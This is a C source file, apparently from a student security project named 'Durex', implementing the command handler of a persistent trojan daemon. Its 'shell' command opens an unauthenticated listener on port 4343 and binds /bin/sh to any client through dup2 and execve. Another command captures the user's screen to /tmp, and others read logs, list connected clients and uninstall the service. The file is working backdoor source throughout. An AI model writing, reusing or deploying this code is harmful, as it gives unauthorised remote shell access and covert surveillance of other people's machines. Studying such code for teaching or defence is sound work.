/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_command.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
/*   Updated: 2019/12/04 14:16:15 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <time.h>
#include <stdio.h>
#include "Durex.h"
#include "server.h"
#include "Daemon.h"

extern char **environ;

static t_bool	server_cmd_help(t_client *client, t_server *server)
{
	char *help_content = "\n"
		COLORIZE(SH_YELLOW, " • Durex commands:\n")
		"\t'help' or '?'\t- Show this message.\n"
		"\t'exit'\t\t- Quit Durex.\n"
		"\t'shell'\t\t- Spawn a shell on port 4343.\n\n"
		COLORIZE(SH_YELLOW, " • Bonus commands:\n")
		"\t'uninstall'\t- Uninstall Durex. (/!\\ kill Durex daemon on success /!\\)\n"
		"\t'log'\t\t- Print durex log file.\n"
		"\t'stat'\t\t- Print status and information about durex.\n"
		"\t'screenshot'\t- Take screenshot of the screen and save it to /tmp folder.\n\n"
		COLORIZE(SH_YELLOW, " • Informations:\n")
		" * You can check install status with 'stat' command.\n"
		" * You can check service status by running: systemctl status durex in shell.\n"
		" * A corrupt installation mean, one of this file is missing:\n\t"
		SERVICE_FILE "\n\t" SERVICE_INSTALL_FILE "\n\t" SERVICE_BIN "\n\n"
		COLORIZE(SH_YELLOW, " • Manual Uninstall:\n")
		" Spawn a shell, using 'shell' then run each following commands:\n"
		" systemctl stop durex;\n systemctl disable durex;\n systemtcl daemon-reload;\n"
		" systemctl reset-failed;\n rm /var/lock/durex.lock;\n"
		" And finally remove all listed file in Informations sections.\n"
		" Don't forget to clean your shit done with root shell.\n"
		"\n";
	if (!server || !client)
		return (false);
	send_text(help_content, client->socket);
	return (true);
}

static t_bool	server_cmd_log(t_client *client, t_server *server)
{
	int		fd;
	int		ret;
	char	buf[READ_BUFFER_SIZE];

	if (!server || !client)
		return (false);
	if ((fd = open(DUREX_LOG_FILE, O_RDONLY)) < 0)
	{
		durex_log("Can't open log file", LOG_WARNING);
		durex_log(strerror(errno), LOG_WARNING);
		send_text("Can't open log file.", client->socket);
		return (false);
	}
	while((ret = read(fd, buf, READ_BUFFER_SIZE)) > 0)
		send(client->socket, buf, ret, 0);
	close(fd);
	return (true);
}

static void		shell_wait(t_server *remote_shell, t_client *client)
{
	t_client	*clt;
	char		*sh[] = { "/bin/sh", NULL };

	clt = NULL;
	send_text(COLORIZE(SH_GREEN, "\t• ") "shell is waiting for connexion.\n"SERVER_PROMPT, client->socket);
	close(client->socket);
	while (1)
	{
		if (!new_client(remote_shell))
		{
			send_text(COLORIZE(SH_RED, "\t• ") "Failed, to connect.\n", client->socket);
			continue ;
		}
		clt = (t_client*)remote_shell->client_lst->content;
		dup2(clt->socket, 0);
		dup2(clt->socket, 1);
		dup2(clt->socket, 2);
		execve(sh[0], sh, environ);
	}
}

static t_bool	server_cmd_shell(t_client *client, t_server *server)
{
	t_server	remote_shell;
	pid_t		pid;

	if (!server || !client)
		return (false);
	send_text(COLORIZE(SH_YELLOW, "• ") "Spawning a shell on port 4343 ...\n", client->socket);
	if ((pid = fork()) < 0)
	{
		send_text("The remote shell has failed.\n", client->socket);
		durex_log("The remote shell has failed.", LOG_WARNING);
		return (false);
	}
	// Child
	else if (pid == 0)
	{
		ft_memset(&remote_shell, 0, sizeof(remote_shell));
		remote_shell.require_pass = false;
		if (create_server(&remote_shell, 4343, 2))
		{
			close(server->socket);
			shell_wait(&remote_shell, client);
		}
		send_text(COLORIZE(SH_RED, "\t• ") "Failed, wait and retry.\n"SERVER_PROMPT, client->socket);
		close(client->socket);
		durex_log("The remote shell has failed.", LOG_WARNING);
		exit(EXIT_FAILURE);
	}
	// Father
	else
		durex_log("Mefait accomplit!", LOG_INFO);
	return (true);
}

static t_bool	server_cmd_exit(t_client *client, t_server *server)
{
	if (!server || !client)
		return (false);
	deco_client(client, server);
	return (true);
}

static t_bool	server_cmd_uninstall(t_client *client, t_server *server)
{
	if (!server || !client)
		return (false);
	if (uninstall_service())
	{
		send_text("Uninstall Durex: " COLORIZE(SH_GREEN, "• ") "Done.\nDurex: "
		COLORIZE(SH_PINK, "• ") "Quitting ...\n", client->socket);
		durex_log("durex service has been removed from system.", LOG_WARNING);
		durex_log("Quitting ...", LOG_INFO);
		ft_lstdel(&server->client_lst, del_client);
		kill_daemon(EXIT_SUCCESS);
	}
	send_text("Uninstall Durex: " COLORIZE(SH_RED, "• ") "Failed.\n"
	COLORIZE(SH_YELLOW, "• ") "Durex: Still running install may be corrupt ...\n", client->socket);
	durex_log("durex uninstall has failed.", LOG_WARNING);
	return (false);
}

/*
** MAX_CLIENT * ft_strlen("Client[xxx.xxx.xxx.xxx]: connected.\n")
*/
static char		*get_client_list(t_server *server)
{
	t_list	*lst;
	char	prefix_str[PREFIX_SIZE] = {0};
	char	clients[MAX_CLIENT * 360] = {0};
	char	*suffix = " connected.\n\t";
	lst = server->client_lst;
	while (lst)
	{
		ft_memset(prefix_str, 0, PREFIX_SIZE);
		if (client_prefix(lst->content, &prefix_str))
		{
			ft_strncat(clients, prefix_str, ft_strlen(prefix_str));
			ft_strncat(clients, suffix, ft_strlen(suffix));
		}
		lst = lst->next;
	}
	return (ft_strdup(clients));
}

static t_bool	server_cmd_stat(t_client *client, t_server *server)
{
	char	*header = NULL;
	char	*install_status = NULL;
	char	*clients = NULL;
	char	footer[64] = {0};
	char	*final_status = NULL;
	size_t	status_len;

	if (!server || !client)
		return (false);

	// Generate informations about Durex
	header = COLORIZE(SH_BLUE, "• ") "Durex status:\n\t";
	if (durex_is_installed())
		install_status = "Durex install: "COLORIZE(SH_GREEN, "• ")
			"Correctly installed.\n\tConnexions:\n\t";
	else
		install_status = "Durex install: "COLORIZE(SH_YELLOW, "• ")
			"Not install or corrupt. (see help)\n\tConnexions:\n\t";
	clients = get_client_list(server);
	sprintf(footer, "Durex running since: %.0f seconds.\n", difftime(time(NULL), server->start_time));

	// Grab all informations in one string
	status_len = ft_strlen(header) + ft_strlen(install_status) + ft_strlen(clients) + ft_strlen(footer);
	final_status = ft_strnew(status_len);
	ft_strncpy(final_status, header, ft_strlen(header));
	ft_strncat(final_status, install_status, ft_strlen(install_status));
	ft_strncat(final_status, clients, ft_strlen(clients));
	ft_strncat(final_status, footer, ft_strlen(footer));

	// Send data to client
	send_text(final_status, client->socket);
	ft_strdel(&final_status);
	ft_strdel(&clients);
	return (true);
}

static t_bool	server_cmd_screenshot(t_client *client, t_server *server)
{
	char	*screenshot[] = {"/usr/bin/import", "-window", "root", "/tmp/img_"__TIME__".jpeg", NULL};
	char	*env[] = {"DISPLAY=:0", "HOME=/home/banthony", NULL};

	if (!server || !client)
		return (false);
	exec_command(screenshot, "Taking screenshot ...", env, client->socket);
	send_text(COLORIZE(SH_YELLOW, "• ")"Info:\tScreenshot end. Check in /tmp folder.\n", client->socket);
	send_text("\tIf the command failed, try install imagemagick-6.q16 using shell.\n", client->socket);
	return (true);
}

static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
{
	[HELP] = COMMAND(help),
 	[HELP_ALIAS] = {"?", server_cmd_help},
	[UNINSTALL] = COMMAND(uninstall),
	[STATUS] = COMMAND(stat),
	[SHELL] = COMMAND(shell),
	[LOG] = COMMAND(log),
	[EXIT] = COMMAND(exit),
	[SCREENSHOT] = COMMAND(screenshot),
};

void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client)
{
	t_server_cmd cmd = -1;

	raw_cmd[cmd_size - 1] = (raw_cmd[cmd_size - 1] == '\n') ? '\0' : raw_cmd[cmd_size - 1];
	durex_log_with(raw_cmd, LOG_INFO, client_prefix, client);
	while (++cmd < SERVER_CMD_NUMBER)
	{
		if (!ft_strncmp(g_server_cmd[cmd].name, raw_cmd, cmd_size))
		{
			g_server_cmd[cmd].func(client, server);
			break ;
		}
	}
	if (cmd != EXIT)
		send_text(SERVER_PROMPT, client->socket);
}
